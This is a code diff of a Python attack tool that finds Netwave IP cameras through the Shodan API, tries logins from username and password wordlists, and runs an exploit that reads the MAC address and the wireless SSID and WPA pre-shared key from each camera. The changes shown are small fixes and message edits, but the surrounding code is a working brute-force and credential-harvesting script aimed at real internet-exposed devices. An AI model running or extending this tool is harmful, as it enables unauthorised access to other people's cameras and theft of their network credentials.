@@ -42,7 +42,7 @@ def main() :
  parser = argparse.ArgumentParser()
  parser.add_argument('-s','--search', dest='search', default='Netwave IP Camera', type=str, help='Default Netwave IP Camera')
  parser.add_argument('-u','--username', dest="username", default="", type=file, help='Select your usernames wordlist')
- parser.add_argument('-p','--wordlist', dest="password", default="", type=file, help='Select your passwords wordlist')
+ parser.add_argument('-w','--wordlist', dest="password", default="", type=file, help='Select your passwords wordlist')
  parser.add_argument('-k','--shodan', dest="address", default='', type=str, help='Shodan API key')
  args = parser.parse_args()
 
@@ -86,7 +86,7 @@ def main() :
    passwords = args.password.readlines()
 
    print(bgcolors.OKGREEN + "[+] Shodan successfully Connected."+ bgcolors.ENDC)
-   print(bgcolors.OKGREEN + "[+] Shodan Exploit Enabled."+ bgcolors.ENDC)
+   print(bgcolors.OKGREEN + "[+] Netwave Exploit Enabled."+ bgcolors.ENDC)
    print(bgcolors.OKGREEN + "[+] Netwave IP Camera Found: %d" % (total) + bgcolors.ENDC)
    print(bgcolors.OKGREEN + "[+] Passwords loaded: %d" % (len(passwords)) + bgcolors.ENDC)
 
@@ -136,9 +136,17 @@ def main() :
          break
         else:
          found = False
+         if ShodanModuleExploit.upper() == "S":
+           exploit = False
+         else:
+          exploit = True
+
       if not(found):
+       if ShodanModuleExploit.upper() == "S":
+          exploit = False
+       else:
+          exploit = True
        print(bgcolors.FAIL + bgcolors.BOLD + "[!] Password not found" + bgcolors.ENDC)
-       pass
      except Exception as e:
       request.close()
       print("Error: %s" % (e))
@@ -169,7 +177,7 @@ def main() :
       else:
         print(bgcolors.FAIL + "[-] Getting mac address" + bgcolors.ENDC)
      except Exception as e:
-      request.connection.close()
+      request.close()
       print("Error : %s" % (e))
      print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, org, product))
      
@@ -188,12 +196,12 @@ def main() :
       if status == 200:
        for crendential in content :
          if crendential.find("WPAPSK") != -1 or crendential.find("SSID") != -1  :
-            crendential = crendential.replace("=", " ")
+            crendential = crendential.replace("=", ": ")
             print(bgcolors.OKGREEN + bgcolors.BOLD + "[+] %s" % crendential + bgcolors.ENDC)  
       else:
        print(bgcolors.FAIL + bgcolors.BOLD + "[!] Wireless lan is disabled.."+ bgcolors.ENDC)
      except Exception as e:
-      request.connection.close()
+      request.close()
       print(bgcolors.FAIL + "[!] Error: %s \nWireless lan is disabled.." % (e) + bgcolors.ENDC)
 
      try:
